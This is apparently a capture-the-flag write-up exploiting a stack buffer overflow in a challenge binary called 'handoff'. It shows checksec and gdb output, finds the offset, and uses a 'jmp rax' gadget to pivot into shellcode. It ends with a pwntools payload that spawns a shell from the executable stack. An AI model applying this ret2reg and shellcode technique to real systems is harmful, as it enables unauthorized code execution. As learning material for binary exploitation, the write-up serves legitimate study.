let's see our binary info/protections :

```sh
file handoff && checksec handoff


handoff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=92ca62928eb98ee283995cddad65f7732aad5e0f, for GNU/Linux 3.2.0, not stripped
[*] '/home/kali/Desktop/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

we are eating good huh ! No canaries , no pie , no NX , we can smell the exploit path , buffer overflow into overwriting saved `rbp` to our shell in the executable stack .

let's look at the code to see if their are any overflows :

```c
else if (choice == 3) {

            choice = -1;

            puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");

            fgets(feedback, NAME_LEN, stdin);

            feedback[7] = '\0';

            break;

        }
```


  we have  `#define NAME_LEN 32`   and   `char feedback[8]` so we can overflow *feedback* with 24 byte ,  but probably this aint enough to write a shell , let's check the rip offset with cyclic and gdb :

 ```bash
 Starting program: /home/kali/Desktop/handoff 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
3
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
aaaabaaacaaadaaaeaaafaaagaaahaa

 ```

```bash
0x00007fffffffdc98│+0x0000: "faaagaaahaa"        ← $rsp
0x00007fffffffdca0│+0x0008: 0x0000000000616168 ("haa"?)
0x00007fffffffdca8│+0x0010: 0x00007ffff7ddaca8  →   mov edi, eax
0x00007fffffffdcb0│+0x0018: 0x00007fffffffdda0  →  0x00007fffffffdda8  →  0x0000000000000038 ("8"?)
0x00007fffffffdcb8│+0x0020: 0x000000000040140f  →  <main+0000> endbr64 
0x00007fffffffdcc0│+0x0028: 0x0000000100400040 ("@"?)
0x00007fffffffdcc8│+0x0030: 0x00007fffffffddb8  →  0x00007fffffffe149  →  "/home/kali/Desktop/handoff"
0x00007fffffffdcd0│+0x0038: 0x00007fffffffddb8  →  0x00007fffffffe149  →  "/home/kali/Desktop/handoff"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401407 <vuln+01de>      jmp    0x401249 <vuln+32>
     0x40140c <vuln+01e3>      nop    
     0x40140d <vuln+01e4>      leave  
 →   0x40140e <vuln+01e5>      ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
```
 
  `cyclic -l faaagaaahaa  ==> 20`  , the offset is 20 so we can't use 4 bytes to write a shell , so we need to write our shell somewhere else :

 ```c
 else if (choice == 2) {
            choice = -1;
            puts("Which recipient would you like to send a message to?");
            if (scanf("%d", &choice) != 1) exit(0);
            getchar();
            if (choice >= total_entries) {
                puts("Invalid entry number");
                continue;
            }
            puts("What message would you like to send them?");

            fgets(entries[choice].msg, MSG_LEN, stdin);//MSG_LEN=64
        }
 ```

there is a bigger buffer in the stack that we can write our shell to , but wait ASLR???
HEHE no problem :
```c
$rax   : 0x00007fffffffdc84  →  0x0061616261616161 ("aaaabaa"?)
```

so before hitting `ret` the register `rax` have the address of the feedback buffer , so we have now a useable address in the stack we need just to calculate the offset .Here is the address of our mssg buffer in the stack .
```css
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffd9b8 - 0x7fffffffd9ef  →   "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]" 
```

so the offset will be `0x00007fffffffdc84 - 0x7fffffffd9b8 = 0x2cc` so now if we find a useful ROP GADGET we can ret2reg :
```bash
ropper -f ./handoff | grep  "jmp"
 0x000000000040116c: jmp rax;
```

 Sweet , so now we can do offset calculation inject assembly in the start feedback jmp to `rax` exec the assembly to jmp to our shell , *` 0x00007fffffffdc84 - 0x7fffffffd9b8 + 1c = 2e8`*
 we have the offset now between `rsp` and our shell so we can craft our payload :

 ```python
 #for feedback
 payload = asm("nop;sub rsp,0x2e8; jmp rsp;") #len=10 and nop for stack align
 payload+=asm("nop")*10 #nop slides to fill the buffer
 payload+=p64(0x40116c) #overwrite rip to our gadget

 #for message
 shell= asm(shellcraft.sh()) 
 ```

this is just the method you can take a look on the payload for the exact exploit . 
								~~PWNED~~

 